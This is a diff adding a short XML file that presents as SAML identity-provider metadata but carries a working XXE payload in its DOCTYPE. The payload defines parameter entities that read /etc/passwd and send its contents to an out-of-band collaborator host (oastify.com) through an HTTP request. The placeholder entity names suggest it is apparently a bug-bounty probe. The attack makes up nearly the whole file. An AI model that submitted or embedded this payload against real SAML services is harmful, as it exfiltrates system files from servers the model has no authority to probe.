@@ -1,0 +1,12 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE EntityDescriptor [
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://i1kkr2svrz2cmgmmgrjk0kmljcp2dr.oastify.com/xxe?d=%file;'>">
+  %eval;
+  %exfil;
+]>
+<EntityDescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata" entityID="https://h1probe.example/entity">
+  <IDPSSODescriptor protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol">
+    <SingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect" Location="https://h1probe.example/sso"/>
+  </IDPSSODescriptor>
+</EntityDescriptor>
